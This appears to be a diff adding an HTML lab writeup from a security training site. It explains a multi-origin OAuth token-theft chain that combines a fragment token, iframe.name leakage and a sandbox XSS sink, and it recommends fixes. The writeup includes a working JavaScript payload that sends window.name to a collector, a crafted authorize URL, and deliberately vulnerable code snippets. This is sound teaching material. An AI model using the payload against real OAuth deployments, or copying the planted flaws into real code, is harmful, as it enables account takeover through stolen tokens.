@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Multi-Origin OAuth Dirty Dancing - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/chains/dd-multi-origin.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev critical">Critical</span>
+      <span class="writeup-category">OAuth &middot; window.name &middot; Multi-Origin &middot; Chain</span>
+    </div>
+
+    <h1>Multi-Origin OAuth Dirty Dancing: Token Theft via <code>window.name</code> + Sandbox XSS</h1>
+    <div class="writeup-author">Realistic 3-origin lab &middot; Inspired by Frans Rosen's "dirty dancing in OAuth" pattern</div>
+
+    <div class="callout callout-vuln">
+      <h4>The pattern</h4>
+      <p>Three origins. An OAuth provider on one, a main app on another, a "sandbox" iframe on a third. A well-intentioned dev uses <code>iframe.name</code> to hand context (URL, referrer) to the sandbox. The sandbox has an XSS sink. The OAuth flow keeps the token in the fragment even when the app rejects the state. The attacker chains all four into zero-interaction token theft.</p>
+    </div>
+
+    <h2>The Three Origins</h2>
+    <ul>
+      <li><strong>Main app</strong>: <code>localhost:3000</code> &mdash; where you sign in, the OAuth callback lives here</li>
+      <li><strong>OAuth IdP</strong>: <code>localhost:4000</code> &mdash; completely separate origin, own cookie</li>
+      <li><strong>Sandbox</strong>: <code>localhost:5000</code> &mdash; where the analytics iframe loads from</li>
+    </ul>
+
+    <h2>The Bugs</h2>
+
+    <h3>Bug A &mdash; Implicit flow leaves the token in the URL</h3>
+    <pre><code>// IdP redirect on response_type=token:
+location = redirect_uri + '#access_token=eyJ...&state=...';</code></pre>
+    <p>The <code>access_token</code> lives in the URL fragment. Anyone who can read <code>location.href</code> on the callback origin can read the token.</p>
+
+    <h3>Bug B &mdash; Callback doesn't strip the fragment on invalid state</h3>
+    <pre><code>// /dd/callback:
+if (gotState !== expectedState) {
+  showError();
+  // URL is NOT cleared. location.hash still contains the token.
+}
+// Load analytics iframe either way...</code></pre>
+
+    <h3>Bug C &mdash; Main app passes sensitive context into <code>iframe.name</code></h3>
+    <pre><code>// Inside the callback page:
+var iframe = document.getElementById('analytics-frame');
+iframe.name = JSON.stringify({ href: location.href, referrer: document.referrer });
+iframe.src = 'http://localhost:5000/embed?src=' + encodeURIComponent(telemetrySrc);</code></pre>
+    <p>The iframe's name is a cross-origin channel: what the parent sets becomes <code>window.name</code> inside the iframe. So whatever JS runs in the sandbox iframe gets to read the victim's full URL &mdash; including the token.</p>
+
+    <h3>Bug D &mdash; Sandbox has an XSS sink</h3>
+    <pre><code>// /embed on :5000:
+res.send('&lt;script&gt;' + req.query.src + '&lt;/script&gt;');</code></pre>
+    <p>Anything in <code>?src=</code> executes. The main app passes <code>telemetry</code> from its own URL into <code>?src=</code>. The attacker controls it.</p>
+
+    <h2>The Chain</h2>
+
+    <div class="attack-flow">
+      <h4>Attack flow</h4>
+      <div class="flow-step"><div class="flow-num">1</div><p>Victim is already signed in to the IdP (separate origin &mdash; normal single sign-on state).</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">2</div><p>Attacker sends victim a crafted link that opens the IdP's <code>/authorize</code> in a popup with:<br><code>response_type=token</code> (implicit) &middot; <code>redirect_uri=/dd/callback?state=bad&amp;telemetry=&lt;attacker JS&gt;</code> &middot; <code>state=...</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">3</div><p>IdP auto-approves (victim is logged in), redirects to <code>/dd/callback?state=bad&amp;telemetry=...#access_token=eyJ...</code>.</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">4</div><p>Callback JS sees state mismatch, shows error. Does NOT clear the URL. Runs the analytics iframe setup.</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">5</div><p>Callback sets <code>iframe.name = JSON.stringify(...)</code>. The iframe's <code>window.name</code> now contains the access token inside <code>href</code>.</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">6</div><p>Callback loads <code>localhost:5000/embed?src=&lt;attacker JS&gt;</code>. Attacker's JS executes in the sandbox origin.</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">7</div><p>Attacker JS reads <code>window.name</code> &rarr; exfils to <code>/dd/collect?data=...</code>.</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">8</div><p>Attacker polls the collector, parses the token, calls the API as the victim.</p></div>
+    </div>
+
+    <h3>The payload</h3>
+    <pre><code>// Attacker's telemetry JS (embedded into ?src= of the sandbox /embed)
+try {
+  var payload = window.name;
+  var img = new Image();
+  img.src = 'http://localhost:3000/dd/collect?data=' + encodeURIComponent(payload);
+} catch(e) {}</code></pre>
+
+    <h3>The malicious URL</h3>
+    <pre><code>http://localhost:4000/authorize?client_id=dash
+  &amp;response_type=token
+  &amp;redirect_uri=http%3A%2F%2Flocalhost%3A3000%2Fdd%2Fcallback%3Fstate%3Dbad_state
+       %26telemetry%3D&lt;URL-encoded JS payload&gt;
+  &amp;state=victim_session
+  &amp;scope=read</code></pre>
+
+    <h2>Why each bug matters</h2>
+
+    <div class="callout callout-impact">
+      <h4>Isolated severity</h4>
+      <p>None of the bugs is critical alone:</p>
+      <ul>
+        <li>Implicit flow in the fragment &mdash; deprecated but common; Low/Medium</li>
+        <li>Callback doesn't clean the fragment &mdash; Informational</li>
+        <li><code>iframe.name</code> leaking the URL to the sandbox &mdash; the "design choice" nobody questions</li>
+        <li>Sandbox XSS &mdash; Medium, but "isolated" because it's on a different origin</li>
+      </ul>
+      <p>Chained together they yield <strong>one-click token theft</strong>. That's the whole point of dirty dancing &mdash; stitching together behaviors that are each individually defensible.</p>
+    </div>
+
+    <h2>Run the lab</h2>
+    <ol>
+      <li>Start the server: <code>node server.js</code></li>
+      <li>Open <code>http://localhost:3000/labs/chains/dd-multi-origin.html</code></li>
+      <li>Click "Open IdP login" once (puts cookie on <code>localhost:4000</code>).</li>
+      <li>Click "Fire exploit (open popup)".</li>
+      <li>The collector panel fills with the stolen URL + token within ~1 second.</li>
+    </ol>
+
+    <h2>How to fix</h2>
+    <ul>
+      <li>Authorization code flow with PKCE (no token in fragment)</li>
+      <li><code>history.replaceState(null, '', location.pathname)</code> on callback load to strip hash</li>
+      <li>Never pass sensitive context into <code>iframe.name</code>. Use <code>postMessage</code> with an allow-list origin.</li>
+      <li>Sandbox <code>/embed</code> must never execute arbitrary <code>src</code>. Serve only a fixed, signed analytics bundle.</li>
+      <li>Pin the sandbox iframe with <code>sandbox="allow-scripts"</code> <em>without</em> <code>allow-same-origin</code>, which breaks most <code>window.name</code> leaks too.</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice</h4>
+        <p>Open the lab, inspect the callback's HTML source, build the payload yourself, then use the attacker control panel to verify.</p>
+      </div>
+      <a href="/labs/chains/dd-multi-origin.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/oauth-dirty-dancing">&larr; OAuth Dirty Dancing (single-origin)</a>
+      <a href="/writeups">All Writeups &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
